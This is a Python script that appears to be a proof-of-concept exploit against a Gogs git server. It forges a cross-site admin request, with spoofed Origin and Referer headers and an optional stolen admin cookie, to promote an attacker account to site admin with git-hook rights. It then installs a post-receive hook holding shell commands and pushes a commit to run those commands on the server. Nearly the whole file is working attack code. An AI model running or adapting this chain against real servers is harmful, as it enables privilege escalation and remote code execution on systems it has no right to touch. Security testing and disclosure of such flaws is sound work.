import argparse
import http.cookiejar
import json
import os
import pathlib
import secrets
import shlex
import ssl
import subprocess
import sys
import tempfile
import urllib.error
import urllib.parse
import urllib.request


class Client:
    def __init__(self, base_url, insecure):
        self.base_url = base_url.rstrip("/")
        self.cookiejar = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(self.cookiejar)]
        if insecure:
            handlers.append(urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
        self.opener = urllib.request.build_opener(*handlers)

    def url(self, path):
        return self.base_url + "/" + path.lstrip("/")

    def request(self, method, path, body=None, headers=None):
        data = None
        final_headers = {}
        if headers:
            final_headers.update(headers)
        if isinstance(body, dict):
            data = urllib.parse.urlencode(body).encode()
            final_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(body, bytes):
            data = body
        elif isinstance(body, str):
            data = body.encode()
        req = urllib.request.Request(self.url(path), data=data, headers=final_headers, method=method)
        try:
            with self.opener.open(req, timeout=30) as resp:
                return resp.status, resp.read(), resp.headers
        except urllib.error.HTTPError as exc:
            payload = exc.read()
            raise RuntimeError(f"{method} {path} returned HTTP {exc.code}: {payload[:500].decode(errors='replace')}") from exc

    def json_post(self, path, payload):
        body = json.dumps(payload, separators=(",", ":")).encode()
        status, data, headers = self.request("POST", path, body, {"Content-Type": "application/json"})
        if data:
            return status, json.loads(data.decode()), headers
        return status, None, headers

    def json_get(self, path):
        status, data, headers = self.request("GET", path)
        if data:
            return status, json.loads(data.decode()), headers
        return status, None, headers

    def login(self, username, password):
        status, data, headers = self.json_post("/api/web/user/sign-in", {
            "username": username,
            "password": password,
            "loginSource": 0,
        })
        return status, data, headers


def run(cmd, cwd=None):
    proc = subprocess.run(cmd, cwd=cwd, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if proc.returncode != 0:
        raise RuntimeError(f"command failed: {' '.join(cmd)}\nstdout:\n{proc.stdout}\nstderr:\n{proc.stderr}")
    return proc


def git_url(base_url, username, password, owner, repo):
    parsed = urllib.parse.urlparse(base_url.rstrip("/"))
    userinfo = urllib.parse.quote(username, safe="") + ":" + urllib.parse.quote(password, safe="") + "@"
    path = parsed.path.rstrip("/") + f"/{urllib.parse.quote(owner)}/{urllib.parse.quote(repo)}.git"
    return urllib.parse.urlunparse((parsed.scheme, userinfo + parsed.netloc, path, "", "", ""))


def read_optional(path):
    if not path:
        return None
    p = pathlib.Path(path)
    if not p.exists():
        return None
    return p.read_text(errors="replace")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-base", required=True)
    parser.add_argument("--admin-user")
    parser.add_argument("--admin-password")
    parser.add_argument("--admin-cookie")
    parser.add_argument("--attacker-user", required=True)
    parser.add_argument("--attacker-password", required=True)
    parser.add_argument("--attacker-id", required=True, type=int)
    parser.add_argument("--attacker-email", required=True)
    parser.add_argument("--owner")
    parser.add_argument("--repo")
    parser.add_argument("--marker-path")
    parser.add_argument("--local-marker")
    parser.add_argument("--origin", default="https://example.invalid")
    parser.add_argument("--work-dir")
    parser.add_argument("--output")
    parser.add_argument("--git", default="git")
    parser.add_argument("--insecure", action="store_true")
    parser.add_argument("--keep-work-dir", action="store_true")
    args = parser.parse_args()

    if not args.admin_cookie and not (args.admin_user and args.admin_password):
        raise SystemExit("provide --admin-cookie or --admin-user with --admin-password")

    owner = args.owner or args.attacker_user
    repo = args.repo or "gogs-hook-proof-" + secrets.token_hex(4)
    marker_path = args.marker_path or "/tmp/gogs_hook_proof_" + secrets.token_hex(4) + ".txt"

    admin = Client(args.target_base, args.insecure)
    if args.admin_user and args.admin_password:
        admin.login(args.admin_user, args.admin_password)

    admin_headers = {
        "Origin": args.origin,
        "Referer": args.origin.rstrip("/") + "/submit.html",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
    }
    if args.admin_cookie:
        admin_headers["Cookie"] = args.admin_cookie

    admin.request("POST", f"/admin/users/{args.attacker_id}", {
        "login_type": "0-0",
        "email": args.attacker_email,
        "max_repo_creation": "-1",
        "active": "on",
        "admin": "on",
        "allow_git_hook": "on",
    }, admin_headers)

    attacker = Client(args.target_base, args.insecure)
    attacker.login(args.attacker_user, args.attacker_password)
    _, attacker_info, _ = attacker.json_get("/api/web/user/info")
    if not attacker_info or not attacker_info.get("isAdmin"):
        raise RuntimeError("attacker account did not become site admin")

    attacker.request("POST", "/repo/create", {
        "user_id": str(args.attacker_id),
        "repo_name": repo,
        "description": "git hook proof",
        "auto_init": "on",
        "readme": "Default",
        "gitignores": "",
        "license": "",
    })

    hook_content = "\n".join([
        "#!/bin/sh",
        "id > " + shlex.quote(marker_path),
        "pwd >> " + shlex.quote(marker_path),
        "",
    ])
    attacker.request("POST", f"/{owner}/{repo}/settings/hooks/git/post-receive", {
        "content": hook_content,
    })

    repo_url = git_url(args.target_base, args.attacker_user, args.attacker_password, owner, repo)
    cleanup = args.work_dir is None
    work_root = args.work_dir or tempfile.mkdtemp(prefix="gogs-hook-proof-")
    pathlib.Path(work_root).mkdir(parents=True, exist_ok=True)
    clone_dir = os.path.join(work_root, "repo")

    run([args.git, "clone", repo_url, clone_dir])
    run([args.git, "config", "user.name", "Gogs Hook Proof"], clone_dir)
    run([args.git, "config", "user.email", "proof@example.test"], clone_dir)
    pathlib.Path(clone_dir, "proof.txt").write_text("trigger\n")
    run([args.git, "add", "proof.txt"], clone_dir)
    run([args.git, "commit", "-m", "Trigger post receive hook"], clone_dir)
    push = run([args.git, "push", "origin", "master"], clone_dir)

    local_marker = read_optional(args.local_marker)
    if args.local_marker and local_marker is None:
        raise RuntimeError("local marker was not created")
    result = {
        "targetBase": args.target_base.rstrip("/"),
        "attackerUser": args.attacker_user,
        "attackerId": args.attacker_id,
        "attackerInfo": attacker_info,
        "repository": f"{owner}/{repo}",
        "markerPath": marker_path,
        "localMarker": local_marker,
        "pushStdout": push.stdout,
        "pushStderr": push.stderr,
    }

    encoded = json.dumps(result, indent=2)
    print(encoded)
    if args.output:
        pathlib.Path(args.output).write_text(encoded + "\n")

    if cleanup and not args.keep_work_dir:
        import shutil
        shutil.rmtree(work_root, ignore_errors=True)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(str(exc), file=sys.stderr)
        sys.exit(1)
